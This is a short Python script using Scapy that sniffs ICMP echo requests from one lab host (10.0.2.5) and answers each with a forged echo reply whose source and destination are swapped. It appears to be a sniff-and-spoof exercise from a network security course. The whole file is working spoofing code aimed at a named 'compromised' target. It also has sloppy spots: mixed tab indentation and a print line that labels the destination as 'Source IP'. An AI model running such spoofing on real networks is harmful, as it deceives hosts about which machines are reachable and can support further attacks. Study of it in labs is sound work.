from scapy.all import *

def spoof_reply(pkt):
    if (pkt[2].type == 8):
    #check if the ICMP is a request

        dst=pkt[1].dst
        #original sending destination
	print("Source IP: ",pkt[1].src)
        src=pkt[1].src
        #original packet source address
	print("Source IP: ",pkt[1].dst)
        seq = pkt[2].seq
        #store the original packet's sequence

        id = pkt[2].id
        #store the original packet's id

        load=pkt[3].load
        #store the original packet's load

        reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
        #build the reply packet based on details from incoming call from the
        #original packet, but flipips dst and src

        send(reply)

if __name__=="__main__":
    
    iface = "enp0s3"
    #define network interface to be used
   
    ip = "10.0.2.5"
    #define the compromised ip target

    
    filter = "icmp and src host " + ip
    # filter to not include anything that isn't icmp requests from 10.0.2.5
 
    sniff(iface=iface, prn=spoof_reply, filter=filter)
    #start sniffing
